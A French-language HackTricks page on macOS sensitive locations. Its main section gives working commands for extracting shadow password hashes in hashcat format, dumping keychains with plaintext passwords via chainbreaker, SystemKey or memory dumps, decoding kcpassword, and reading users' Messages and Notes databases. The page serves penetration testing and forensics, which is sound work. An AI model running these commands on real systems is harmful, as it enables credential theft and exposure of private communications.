# macOS Sensitive Locations & Interesting Daemons

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mots de passe

### Mots de passe Shadow

Le mot de passe shadow est stocké avec la configuration de l'utilisateur dans des plists situées dans **`/var/db/dslocal/nodes/Default/users/`**.\
La ligne de commande suivante peut être utilisée pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hachage) :

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-ci**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash au **format** **hashcat**.

Une alternative en une ligne qui va extraire les identifiants de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Dump de trousseau

Notez que lors de l'utilisation du binaire de sécurité pour **extraire les mots de passe déchiffrés**, plusieurs invites demanderont à l'utilisateur d'autoriser cette opération.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
D'après ce commentaire [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), il semble que ces outils ne fonctionnent plus dans Big Sur.
{% endhint %}

### Aperçu de Keychaindump

Un outil nommé **keychaindump** a été développé pour extraire des mots de passe des porte-clés macOS, mais il rencontre des limitations sur les versions macOS plus récentes comme Big Sur, comme indiqué dans une [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'utilisation de **keychaindump** nécessite que l'attaquant obtienne un accès et élève ses privilèges à **root**. L'outil exploite le fait que le porte-clé est déverrouillé par défaut lors de la connexion de l'utilisateur pour des raisons de commodité, permettant aux applications d'y accéder sans nécessiter le mot de passe de l'utilisateur à plusieurs reprises. Cependant, si un utilisateur choisit de verrouiller son porte-clé après chaque utilisation, **keychaindump** devient inefficace.

**Keychaindump** fonctionne en ciblant un processus spécifique appelé **securityd**, décrit par Apple comme un démon pour les opérations d'autorisation et cryptographiques, crucial pour accéder au porte-clé. Le processus d'extraction implique l'identification d'une **Clé Maîtresse** dérivée du mot de passe de connexion de l'utilisateur. Cette clé est essentielle pour lire le fichier du porte-clé. Pour localiser la **Clé Maîtresse**, **keychaindump** scanne le tas de mémoire de **securityd** en utilisant la commande `vmmap`, à la recherche de clés potentielles dans des zones marquées comme `MALLOC_TINY`. La commande suivante est utilisée pour inspecter ces emplacements mémoire :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Après avoir identifié des clés maîtresses potentielles, **keychaindump** recherche dans les tas un motif spécifique (`0x0000000000000018`) qui indique un candidat pour la clé maîtresse. D'autres étapes, y compris la déobfuscation, sont nécessaires pour utiliser cette clé, comme l'indique le code source de **keychaindump**. Les analystes se concentrant sur ce domaine doivent noter que les données cruciales pour déchiffrer le trousseau sont stockées dans la mémoire du processus **securityd**. Une commande exemple pour exécuter **keychaindump** est :
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un trousseau OSX de manière forensiquement valide :

* Mot de passe de trousseau haché, adapté pour le craquage avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
* Mots de passe Internet
* Mots de passe génériques
* Clés privées
* Clés publiques
* Certificats X509
* Notes sécurisées
* Mots de passe Appleshare

Étant donné le mot de passe de déverrouillage du trousseau, une clé maître obtenue en utilisant [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey, Chainbreaker fournira également des mots de passe en texte clair.

Sans l'une de ces méthodes de déverrouillage du trousseau, Chainbreaker affichera toutes les autres informations disponibles.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump des clés de trousseau (avec mots de passe) avec SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des clés de trousseau (avec mots de passe) en craquant le hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des clés du trousseau (avec mots de passe) avec un dump mémoire**

[Suivez ces étapes](../#dumping-memory-with-osxpmem) pour effectuer un **dump mémoire**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des clés du trousseau (avec mots de passe) en utilisant le mot de passe de l'utilisateur**

Si vous connaissez le mot de passe de l'utilisateur, vous pouvez l'utiliser pour **extraire et déchiffrer les trousseaux qui appartiennent à l'utilisateur**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Le fichier **kcpassword** est un fichier qui contient le **mot de passe de connexion de l'utilisateur**, mais seulement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l'utilisateur sera automatiquement connecté sans qu'on lui demande un mot de passe (ce qui n'est pas très sécurisé).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xored avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l'utilisateur est plus long que la clé, la clé sera réutilisée.\
Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informations intéressantes dans les bases de données

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Vous pouvez trouver les données de Notifications dans `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La plupart des informations intéressantes se trouveront dans **blob**. Vous devrez donc **extraire** ce contenu et le **transformer** en **lisible** **par** **un** **humain** ou utiliser **`strings`**. Pour y accéder, vous pouvez faire : 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

Les **notes** des utilisateurs peuvent être trouvées dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Préférences

Dans les applications macOS, les préférences se trouvent dans **`$HOME/Library/Preferences`** et dans iOS, elles se trouvent dans `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

Dans macOS, l'outil cli **`defaults`** peut être utilisé pour **modifier le fichier de préférences**.

**`/usr/sbin/cfprefsd`** revendique les services XPC `com.apple.cfprefsd.daemon` et `com.apple.cfprefsd.agent` et peut être appelé pour effectuer des actions telles que modifier les préférences.

## Notifications système

### Notifications Darwin

Le principal démon pour les notifications est **`/usr/sbin/notifyd`**. Afin de recevoir des notifications, les clients doivent s'enregistrer via le port Mach `com.apple.system.notification_center` (vérifiez-les avec `sudo lsmp -p <pid notifyd>`). Le démon est configurable avec le fichier `/etc/notify.conf`.

Les noms utilisés pour les notifications sont des notations DNS inversées uniques et lorsqu'une notification est envoyée à l'un d'eux, le(s) client(s) qui ont indiqué qu'ils peuvent la gérer la recevront.

Il est possible de dumper l'état actuel (et de voir tous les noms) en envoyant le signal SIGUSR2 au processus notifyd et en lisant le fichier généré : `/var/run/notifyd_<pid>.status` :
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Le **Distributed Notification Center** dont le binaire principal est **`/usr/sbin/distnoted`**, est un autre moyen d'envoyer des notifications. Il expose certains services XPC et effectue des vérifications pour essayer de vérifier les clients.

### Apple Push Notifications (APN)

Dans ce cas, les applications peuvent s'inscrire à des **topics**. Le client générera un jeton en contactant les serveurs d'Apple via **`apsd`**.\
Ensuite, les fournisseurs auront également généré un jeton et pourront se connecter aux serveurs d'Apple pour envoyer des messages aux clients. Ces messages seront reçus localement par **`apsd`** qui relayera la notification à l'application qui l'attend.

Les préférences sont situées dans `/Library/Preferences/com.apple.apsd.plist`.

Il existe une base de données locale de messages située dans macOS à `/Library/Application\ Support/ApplePushService/aps.db` et dans iOS à `/var/mobile/Library/ApplePushService`. Elle contient 3 tables : `incoming_messages`, `outgoing_messages` et `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Il est également possible d'obtenir des informations sur le démon et les connexions en utilisant :
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifications Utilisateur

Ce sont des notifications que l'utilisateur devrait voir à l'écran :

* **`CFUserNotification`** : Cette API fournit un moyen d'afficher à l'écran une fenêtre contextuelle avec un message.
* **Le Tableau d'Affichage** : Cela montre sur iOS une bannière qui disparaît et sera stockée dans le Centre de Notifications.
* **`NSUserNotificationCenter`** : C'est le tableau d'affichage iOS sur MacOS. La base de données avec les notifications est située dans `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
